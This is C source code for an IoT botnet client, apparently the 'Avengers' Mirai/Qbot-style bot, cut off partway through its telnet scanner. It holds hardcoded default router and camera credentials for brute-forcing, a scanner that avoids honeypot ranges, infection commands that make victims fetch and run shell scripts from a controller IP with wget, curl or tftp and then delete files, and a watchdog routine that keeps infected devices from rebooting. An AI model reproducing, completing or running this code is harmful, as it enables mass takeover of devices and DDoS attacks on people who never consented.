#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(ip1), sizeof(ip2), sizeof(ip3), sizeof(ip4))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define OPT_SGA   3
#define PHI 0x9e3779b9
#define CMD_IAC 255
#define CMD_WILL 251
#define CMD_WONT 252
#define CMD_DO 253
#define CMD_DONT 254
#define STD2_SIZE 53
#define BUFFER_SIZE 1024	

#include "headers/includes.h"
#include "headers/util.h"
#include "headers/table.h"
#include "config.h"

#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>

const char *UserAgents[] = {
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
    "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
    "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
    "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
    "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
    "Mozilla/5.0 (PLAYSTATION 3; 3.55)",
    "Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
    "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0",
    "SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
    "MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0",
    "Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
    "Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000",
    "MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
    "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
    "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
    "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
    "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
    "Mozilla/5.0 (PLAYSTATION 3; 3.55)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
	"Avengers botnet build 1 has ddosed you rawrxd"
};
const char *infect_wget[] = { "cd /tmp;/bin/busybox wget %s.%s.%s.%s/bins.sh;wget %s.%s.%s.%s/bins.sh;sh bins.sh;rm -rf *", ip1, ip2, ip3, ip4, ip1, ip2, ip3, ip4 };
const char *infect_curl[] = { "cd /tmp;/bin/busybox curl -o curl.sh %s.%s.%s.%s/curl.sh;curl -o curl.sh %s.%s.%s.%s/curl.sh; sh curl.sh;rm -rf *", ip1, ip2, ip3, ip4, ip1, ip2, ip3, ip4 };
const char *infect_tftp1[] = { "cd /tmp;/bin/busybox tftp -c -r tftp.sh %s.%s.%s.%s;tftp -c -r tftp.sh %s.%s.%s.%s;sh tftp.sh;rm -rf *", ip1, ip2, ip3, ip4, ip1, ip2, ip3, ip4 };
const char *infect_tftp2[] = {"cd /tmp;/bin/busybox tftp %s.%s.%s.%s -c get tftp.sh;tftp %s.%s.%s.%s -c get tftp.sh;sh tftp.sh;rm -rf *", ip1, ip2, ip3, ip4, ip1, ip2, ip3, ip4 };
char *user[] = {
    "admin\0",
    "admin\0", //guest:12345
    "admin\0",
    "default\0",  //default:
    "guest\0",
    "telecomadmin\0",
    "root\0",
    "e8ehome\0", //e8ehome:e8ehomeusr
    "telnetadmin\0", 
    "e8telnet\0", //e8telnet:e8telnet
    "nr2g\0",
    "user\0",
    "e8ehome1\0",    //e8ehome1:e8ehome1
    "vstarcam2015\0",  //vstarcam2015:20150602
    "root\0", //root:vizxv
    "root\0", //root:xc3511
    "root\0", //root:antslq
    "root\0",
    "realtek\0",
    "root\0", //root:123456
    "support\0", //support:support
    "root\0", //root:5up
    "operator\0" //operator:operator
  };
char *pass[] = {
    "admin\0",
    "admin\0",
    "7ujMko0admin\0"
    "\0", 
    "12345\0",
    "nE7jA%5m\0",
    "hg2x0\0",
    "e8ehome\0", 
    "telnetadmin\0", //telnetadmin:telnetadmin
    "e8telnet\0", 
    "digitel\0",
    "digi\0",
    "e8ehome1\0", 
    "20150602\0", 
    "vizxv\0", 
    "xc3511\0", 
    "antslq\0", 
    "realtek\0",
    "123456\0",
    "Zte521\0", 
    "support\0", 
    "5up\0", 
    "operator\0"};
char *tmpdirs[] = {"/dev/netslink/", "/tmp/", "/var/", "/dev/", "/var/run/", "/dev/shm/", "/mnt/", "/boot/", "/usr/", "/opt/", (char*)0};
char *advances[] = {":", "ogin", "sername", "assword", (char*)0};
char *fails[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", (char*)0};
char *successes[] = {"busybox", "$", "#", (char*)0};
char *advances2[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", "busybox", "$", "#", (char*)0};

char *inet_ntoa(struct in_addr in);
int initConnection();
int sockprintf(int sock, char *formatStr, ...);
int avengerCommSock = 0, AvengerSever = -1, userID = 1, watchdog_pid = 0;

uint32_t *pids;
uint32_t scanPid;
uint32_t ngPid;
uint64_t numpids = 0;
struct in_addr ourIP;
unsigned char macAddress[6] = {0};

static uint32_t Q[4096], c = 362436;

void makeRandomStr(unsigned char *buf, int length);
void watchdog_maintain(void)
{
    watchdog_pid = fork();
    if(watchdog_pid > 0 || watchdog_pid == -1)
        return;

    int timeout = 1;
    int watchdog_fd = 0;
    int found = FALSE;

    table_unlock_val(TABLE_MISC_WATCHDOG);
    table_unlock_val(TABLE_MISC_WATCHDOG2);

    if((watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG2, NULL), 2)) != -1)
    {
        found = TRUE;
        ioctl(watchdog_fd, 0x80045704, &timeout);
    }
    
    if(found)
    {
        while(TRUE)
        {
            ioctl(watchdog_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    
    table_lock_val(TABLE_MISC_WATCHDOG);
    table_lock_val(TABLE_MISC_WATCHDOG2);

    
    exit(0);
}
void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}


void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}

uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
void rand_alphastr(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
char *makestring() 
{
	char *tmp;
	int len=(rand()%5)+4,i;
 	FILE *file;
	tmp=(char*)malloc(len+1);
 	memset(tmp,0,len+1);
 	if ((file=fopen("/usr/dict/words","r")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
	else {
		int a=((rand()*rand())%45402)+1;
		char buf[1024];
		for (i=0;i<a;i++) fgets(buf,1024,file);
		memset(buf,0,1024);
		fgets(buf,1024,file);
		rand_alphastr(buf);
		memcpy(tmp,buf,len);
		fclose(file);
	}
	return tmp;
}
static void printchar(unsigned char **str, int c)
{
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
        register int pc = 0, padchar = ' ';

        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }

        return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';

        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];

        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
							    register char *s = (char *)va_arg( args, intptr_t );
                                pc += prints (out, s?s:"(null)", width, pad);
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}

int zprintf(const unsigned char *format, ...)
{
        va_list args;
        va_start( args, format );
        return print( 0, format, args );
}

int szprintf(unsigned char *out, const unsigned char *format, ...)
{
        va_list args;
        va_start( args, format );
        return print( &out, format, args );
}

int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        //zprintf("buf: %s\n", orig);
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}


static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type)
{
        register int iop;
        int pdes[2], fds, pid;

        if (*type != 'r' && *type != 'w' || type[1]) return -1;

        if (pipe(pdes) < 0) return -1;
        if (fdopen_pids == NULL) {
                if ((fds = getdtablesize()) <= 0) return -1;
                if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
                memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
        }

        switch (pid = vfork())
        {
        case -1:
                close(pdes[0]);
                close(pdes[1]);
                return -1;
        case 0:
                if (*type == 'r') {
                        if (pdes[1] != 1) {
                                dup2(pdes[1], 1);
                                close(pdes[1]);
                        }
                        close(pdes[0]);
                } else {
                        if (pdes[0] != 0) {
                                (void) dup2(pdes[0], 0);
                                (void) close(pdes[0]);
                        }
                        (void) close(pdes[1]);
                }
                execl("/bin/sh", "sh", "-c", program, NULL);
                _exit(127);
        }
        if (*type == 'r') {
                iop = pdes[0];
                (void) close(pdes[1]);
        } else {
                iop = pdes[1];
                (void) close(pdes[0]);
        }
        fdopen_pids[iop] = pid;
        return (iop);
}

int fdpclose(int iop)
{
        register int fdes;
        sigset_t omask, nmask;
        int pstat;
        register int pid;

        if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
        (void) close(iop);
        sigemptyset(&nmask);
        sigaddset(&nmask, SIGINT);
        sigaddset(&nmask, SIGQUIT);
        sigaddset(&nmask, SIGHUP);
        (void) sigprocmask(SIG_BLOCK, &nmask, &omask);
        do {
                pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
        } while (pid == -1 && errno == EINTR);
        (void) sigprocmask(SIG_SETMASK, &omask, NULL);
        fdopen_pids[fdes] = 0;
        return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int got = 1, total = 0;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got == 0 ? NULL : buffer;
}

static const long hextable[] = {
        [0 ... 255] = -1,
        ['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
        ['A'] = 10, 11, 12, 13, 14, 15,
        ['a'] = 10, 11, 12, 13, 14, 15
};

long parseHex(unsigned char *hex)
{
        long ret = 0;
        while (*hex && ret >= 0) ret = (ret << 4) | hextable[*hex++];
        return ret;
}

int wildString(const unsigned char* pattern, const unsigned char* string) {
        switch(*pattern)
        {
        case '\0': return *string;
        case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
        case '?': return !(*string && !wildString(pattern+1, string+1));
        default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
        }
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void uppercase(unsigned char *str)
{
        while(*str) { *str = toupper(*str); str++; }
}



void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);

        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {

                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }

                        break;
                }
        }

        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;

        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(avengerCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;

//      zprintf("recv: %s\n", cp);

        return count;
}


int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}

int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}

struct telstate_t
{
int fd;
unsigned int ip;
unsigned char state;
unsigned char complete;
unsigned char usernameInd;
unsigned char passwordInd;
unsigned char tempDirInd;
unsigned int totalTimeout;
unsigned short bufUsed;
char *sockbuf;
};
const char* get_telstate_host(struct telstate_t* telstate)
{
struct in_addr in_addr_ip;
in_addr_ip.s_addr = telstate->ip;
return inet_ntoa(in_addr_ip);
}

 int negotiate(int sock, unsigned char *buf, int len) {
	unsigned char c;
	switch (buf[1]) {
		case CMD_IAC:  return 0;
		case CMD_WILL:
		case CMD_WONT:
		case CMD_DO:
		case CMD_DONT:
		c = CMD_IAC;
		send(sock, &c, 1, MSG_NOSIGNAL);
		if (CMD_WONT == buf[1]) c = CMD_DONT;
		else if (CMD_DONT == buf[1]) c = CMD_WONT;
		else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
		else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
		send(sock, &c, 1, MSG_NOSIGNAL);
		send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
		break;
		default:
		break;
	}
	return 0;
}
 

int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char** strings)
{
int num_bytes, i;
memset(buffer, 0, buf_size);
num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);
 
if(buffer[0] == 0xFF)
{
negotiate(fd, buffer, 3);
}
 
if(contains_string(buffer, strings))
{
return 1;
}
 
return 0;
}
int read_with_timeout(int fd, int timeout_usec, char* buffer, int buf_size)
{
fd_set read_set;
struct timeval tv;
tv.tv_sec = 0;
tv.tv_usec = timeout_usec;
 
FD_ZERO(&read_set);
FD_SET(fd, &read_set);
 
if (select(fd+1, &read_set, NULL, NULL, &tv) < 1)
return 0;
 
return recv(fd, buffer, buf_size, 0);
}
void advance_state(struct telstate_t* telstate, int new_state)
{
if(new_state == 0)
{
close(telstate->fd);
}
 
telstate->totalTimeout = 0;
telstate->state = new_state;
memset((telstate->sockbuf), 0, BUFFER_SIZE);
}
 
void reset_telstate(struct telstate_t* telstate)
{
advance_state(telstate, 0);	
telstate->complete = 1;
}
int contains_success(char* buffer)
{
return contains_string(buffer, successes);
}
int contains_fail(char* buffer)
{
return contains_string(buffer, fails);
}
int contains_response(char* buffer)
{
return contains_success(buffer) || contains_fail(buffer);
}
int contains_string(char* buffer, char** strings)
{
int num_strings = 0, i = 0;
 
for(num_strings = 0; strings[++num_strings] != 0; );
 
for(i = 0; i < num_strings; i++)
{
if(strcasestr(buffer, strings[i]))
{
return 1;
}
}
 
return 0;
}
 

in_addr_t findRandIP(in_addr_t netmask)
{
in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
return tmp ^ ( rand_cmwc() & ~netmask);
}

unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}

static ipv4_t get_random_ip(void)
{
	uint8_t ipState[4] = {0};

    do
    {	
    ipState[0] = rand() % 223;
	ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;
	ipState[3] = rand() % 255;
    }
    while 
		  (ipState[0] == 106 && ipState[1] == 186 ||               // 106.186.0.0/16   - honeypot
		  (ipState[0] == 106 && ipState[1] == 187) ||               // 106.187.0.0/16   - honeypot
		  (ipState[0] == 127) ||
		  (ipState[0] == 106 && ipState[1] == 185) ||               // 106.187.0.0/16   - honeypot
		  (ipState[0] == 106 && ipState[1] == 184) ||               // 106.187.0.0/16   - honeypot
		  (ipState[0] == 150 && ipState[1] == 31) ||                // 150.31.0.0/16    - honeypot
		  (ipState[0] == 49 && ipState[1] == 51) ||                 // 49.51.0.0/16     - honeypot
		  (ipState[0] == 178 && ipState[1] == 62) ||                // 178.62.0.0/16    - honeypot
		  (ipState[0] == 160 && ipState[1] == 13)               // 160.13.0.0/16    - honeypot
    );

    return INET_ADDR(ipState[0],ipState[1],ipState[2],ipState[3]);
}

void TelnetRep(int wait_usec, int maxfds) {
	int i, res, num_tmps, j;
	char buf[128], cur_dir;
	int max = maxfds;
	fd_set fdset;
	struct timeval tv;
	socklen_t lon;
	int valopt;
	srand(time(NULL) ^ rand_cmwc());
	char line[256];
	char* buffer;
	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(23);
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
	buffer = malloc(BUFFER_SIZE + 1);
	memset(buffer, 0, BUFFER_SIZE + 1);
	struct telstate_t fds[max];
	memset(fds, 0, max * (sizeof(int) + 1));
	for(i = 0; i < max; i++) {
		memset(&(fds[i]), 0, sizeof(struct telstate_t));
		fds[i].complete = 1;
		fds[i].sockbuf = buffer;
	}
	for(num_tmps = 0; tmpdirs[++num_tmps] != 0; );
	while(1) {
		for(i = 0; i < max; i++) {
			if(fds[i].totalTimeout == 0) {
				fds[i].totalTimeout = time(NULL);
			}
			switch(fds[i].state) {
				case 0: {
					if(fds[i].complete == 1) {
						char *tmp = fds[i].sockbuf;
						memset(&(fds[i]), 0, sizeof(struct telstate_t));
						fds[i].sockbuf = tmp;
						fds[i].ip = get_random_ip();
					}
					else if(fds[i].complete == 0) {
						fds[i].passwordInd++;
						fds[i].usernameInd++;
						if(fds[i].passwordInd == sizeof(user) / sizeof(char *)) {
							fds[i].complete = 1;
							continue;
						}
						if(fds[i].usernameInd == sizeof(pass) / sizeof(char *)) {
							fds[i].complete = 1;
							continue;
						}
					}
					dest_addr.sin_family = AF_INET;
				  dest_addr.sin_port = htons(23);
					memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
					dest_addr.sin_addr.s_addr = fds[i].ip;
					fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
					if(fds[i].fd == -1) continue;
					fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
					if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) {
						reset_telstate(&fds[i]);
					} else {
						advance_state(&fds[i], 1);
					}
				}
				break;
				case 1: {
					FD_ZERO(&fdset);
					FD_SET(fds[i].fd, &fdset);
					tv.tv_sec = 0;
					tv.tv_usec = wait_usec;
					res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
					if(res == 1) {
						lon = sizeof(int);
						valopt = 0;
						getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
						if(valopt) {
							reset_telstate(&fds[i]);
						} else {
							fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
							advance_state(&fds[i], 2);
						}
						continue;
					}
					else if(res == -1) {
						reset_telstate(&fds[i]);
						continue;
					}
					if(fds[i].totalTimeout + 5 < time(NULL)) {
						reset_telstate(&fds[i]);
					}
				}
				break;
				case 2: {
					if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances)) {
						if(contains_fail(fds[i].sockbuf)) {
							advance_state(&fds[i], 0);
						} else {
							advance_state(&fds[i], 3);
						}
						continue;
					}
					if(fds[i].totalTimeout + 7 < time(NULL)) {
						reset_telstate(&fds[i]);
					}
				}
				break;
				case 3: {
					if(send(fds[i].fd, user[fds[i].usernameInd], strlen(user[fds[i].usernameInd]), MSG_NOSIGNAL) < 0) {
						reset_telstate(&fds[i]);
						continue;
					}
					if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
						reset_telstate(&fds[i]);
						continue;
					}
					advance_state(&fds[i], 4);
				}
				break;
				case 4: {
					if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances)) {
						if(contains_fail(fds[i].sockbuf)) {
							advance_state(&fds[i], 0);
						} else {
							advance_state(&fds[i], 5);
						}
						continue;
					}
					if(fds[i].totalTimeout + 3 < time(NULL)) {
						reset_telstate(&fds[i]);
					}
				}
				break;
				case 5: {
					if(send(fds[i].fd, pass[fds[i].passwordInd], strlen(pass[fds[i].passwordInd]), MSG_NOSIGNAL) < 0) {
						reset_telstate(&fds[i]);
						continue;
					}
					if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
						reset_telstate(&fds[i]);
						continue;
					}
					advance_state(&fds[i], 6);
				}
				break;
				case 6: {
					if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances2)) {
						fds[i].totalTimeout = time(NULL);
